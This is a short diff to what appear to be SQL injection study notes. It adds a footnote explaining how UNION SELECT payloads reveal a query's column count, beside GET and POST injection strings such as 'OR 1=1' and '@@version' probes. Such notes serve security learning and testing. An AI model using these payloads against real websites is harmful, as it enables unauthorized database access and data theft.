@@ -79,7 +79,7 @@ Blind Injection:
 Used when unsanitized fields give generic error or no messages
 
 GET METHOD:
-- <URL>/.php?Selection=2 Union SELECT 1,2
+- <URL>/.php?Selection=2 Union SELECT 1,2 **
 - <URL>/.php?item=4 OR 1=1
 - <URL>/.php?item=4 UNION SELECT 1,2
 - <URL>/.php?item=4 UNION SELECT 1,2,@@version
@@ -88,6 +88,8 @@ GET METHOD:
 POST METHOD
 - Audi' UNION SELECT 1,2,3,4 #                
 
+** "The above syntax inserts a SQL query at the end of URL query string (GET), OR input field (POST) to determine schema (structure) of the table, by incrementing by one more field 
+(5,6,7,etc.) until results, or an error, are displayed. This provides an attacker more information about how may fields are configured in the query."
 
 
 
